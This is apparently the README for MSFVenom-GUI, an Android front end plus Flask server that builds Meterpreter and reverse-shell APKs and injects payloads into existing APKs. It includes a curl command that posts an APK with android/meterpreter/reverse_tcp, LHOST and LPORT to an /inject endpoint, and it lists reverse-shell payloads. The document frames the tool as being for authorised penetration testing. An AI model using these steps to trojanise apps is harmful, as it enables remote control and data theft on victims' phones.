# MSFVenom-GUI (Android Application)

An Android application that provides a graphical user interface (GUI) for MSFVenom, making payload generation and APK injection easy and accessible on your mobile device.

## Features

- **APK Payload Generation**: Generate Android payloads directly as APK files
- **APK Injection**: Inject payloads into existing APK files (via companion server)
- **Multiple Payload Types**: Support for various Android payloads including Meterpreter and shell payloads
- **Network-Based Architecture**: Uses a companion server for msfvenom execution
- **User-Friendly Interface**: Intuitive GUI with real-time feedback

## Architecture

Due to Android security restrictions, this application uses a hybrid architecture:

1. **Android App**: Provides the user interface and handles user input
2. **Companion Server**: Runs msfvenom commands and serves generated payloads
3. **Network Communication**: App communicates with server via HTTP API

## Installation & Setup

### 1. Install Metasploit Framework (Server Side)

On your server/computer (Linux/macOS):

```bash
# Install Metasploit Framework
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall

# Verify installation
msfvenom --help
```

### 2. Set Up the Companion Server

```bash
# Install Python dependencies
pip3 install flask

# Run the server
python3 msfvenom_server.py
```

The server will start on `http://localhost:8080` by default.

### 3. Install the Android App

1. Build the APK using Android Studio or Gradle:
   ```bash
   ./gradlew assembleRelease
   ```
2. Install the generated APK on your Android device
3. Grant necessary permissions when prompted

## Usage

### Basic Payload Generation

1. **Launch the app** on your Android device
2. **Configure server connection**:
   - Enter your server URL (e.g., `http://192.168.1.100:8080`)
   - Tap "Test Server Connection" to verify connectivity
3. **Set payload parameters**:
   - Select payload type from dropdown
   - Enter LHOST (your IP address)
   - Enter LPORT (listening port)
4. **Generate payload**:
   - Tap "Generate APK Payload"
   - Wait for generation to complete
   - APK will be saved to Downloads folder

### APK Injection (Server API)

You can also inject payloads into existing APK files using the server API:

```bash
curl -X POST \
  -F "apk=@/path/to/original.apk" \
  -F "payload=android/meterpreter/reverse_tcp" \
  -F "lhost=192.168.1.100" \
  -F "lport=4444" \
  http://localhost:8080/inject \
  -o injected_payload.apk
```

## API Endpoints

The companion server provides the following endpoints:

- `GET /status` - Health check
- `GET /generate` - Generate payload
- `POST /inject` - Inject payload into APK
- `GET /payloads` - List available payloads

## Supported Payloads

- `android/meterpreter/reverse_tcp`
- `android/meterpreter/reverse_https`
- `android/shell/reverse_tcp`
- `android/shell/reverse_https`

## Security Considerations

- **Network Security**: Use HTTPS in production environments
- **Access Control**: Implement authentication for the server API
- **Firewall**: Restrict server access to trusted networks only
- **File Cleanup**: Server automatically cleans up temporary files

## Troubleshooting

### Common Issues

1. **Connection Failed**:
   - Verify server is running
   - Check firewall settings
   - Ensure correct IP address and port

2. **Permission Denied**:
   - Grant storage permissions to the app
   - Check Android security settings

3. **Payload Generation Failed**:
   - Verify msfvenom is installed on server
   - Check server logs for detailed error messages

### Server Logs

Monitor server logs for debugging:
```bash
python3 msfvenom_server.py
```

## Requirements

### Android App
- Android 12+ (API level 31+)
- Storage permissions
- Network access

### Server
- Linux/macOS/Windows
- Python 3.6+
- Metasploit Framework
- Flask (`pip3 install flask`)

## Disclaimer

This application is for educational and authorized penetration testing purposes only. Do not use it on systems you do not own or have explicit permission to test. The authors are not responsible for any misuse of this software.

## License

This project is provided as-is for educational purposes. Use responsibly and in accordance with applicable laws and regulations.

---

Created by [webmaster-exit-1](https://github.com/webmaster-exit-1)
